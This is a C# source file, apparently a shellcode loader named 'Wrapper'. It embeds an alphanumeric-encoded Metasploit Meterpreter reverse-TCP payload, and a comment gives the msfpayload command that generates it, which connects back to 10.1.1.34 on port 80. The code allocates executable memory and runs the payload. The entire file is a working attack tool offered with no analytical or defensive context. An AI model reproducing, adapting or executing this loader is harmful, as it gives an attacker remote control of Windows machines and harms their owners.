﻿using System;
using System.Runtime.InteropServices;

namespace Wrapper
{
    class Program
    {
        [Flags]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            GUARD_Modifierflag = 0x100,
            NOCACHE_Modifierflag = 0x200,
            WRITECOMBINE_Modifierflag = 0x400
        }

        public enum FreeType : uint
        {
            MEM_DECOMMIT = 0x4000,
            MEM_RELEASE = 0x8000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, FreeType dwFreeType);

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        public delegate Int32 ExecuteDelegate();

        static void Main()
        {
            // msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=80 LHOST=10.1.1.34 R| msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
            string shellcode = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIil9xlIGpc030qpk9IuUaKbBDlK3bTpNksbTLlKaBwdLKcB4hfo87rjwV019oVQkpllUlcQCLURVLEpza8Ofmc1hGZBJPaBBwNk3bdPLKBbwLs1N0LKsp48LEkpRTCzfahPbplKG8GhNkQHups1Kc8cWL2iLKFTlKgqHVVQKODqkpnLZazofmEQYWUh9p1ehtwssMih7KcMUtSExbrxnk1HgT6an356nktLPKNkBx7l5QN3Nk4DNkC1hPniCtgTtdaKske1pYaJBqIoIprxco0ZNk7bJKMVsmCX4s6RS0S0E8cGRSVRSo1DqxpL3G6F6gYon5H8Z07qePUPFIo4F4BpPhUyMPpkC0ioiE600PBppPg0BpQP2pQxYztOYOM0ioXUJ7BJtERHEZGqeQ12rHWrc07pBpmYzF3ZB01FPWe8MIleT4u1Yon5K5O03DvlioRntH3EHlbHzPLuI2PVIo9ECZ30QztDRvCgBHuRJyiXSo9oYENk4vPjw0BHWpdPEPC00VcZGp0hrxoTscyuyoHUnsF31zUPcfCc67BHERII9XsoioHUEQhC4iO6mU9f3EjLZcAA";

            byte[] sc = new byte[shellcode.Length];

            for (int i = 0; i < shellcode.Length; i++)
            {
                sc[i] = Convert.ToByte(shellcode[i]);
            }

            // Allocate RWX memory for the shellcode
            IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
            System.Diagnostics.Debug.Assert(baseAddr != IntPtr.Zero, "Error: Couldn't allocate remote memory");

            try
            {
                // Copy shellcode to RWX buffer
                Marshal.Copy(sc, 0, baseAddr, sc.Length);

                // Get pointer to function created in memory
                ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));

                del();
            }
            finally
            {
                VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
            }

            Console.ReadLine();
        }
    }
}
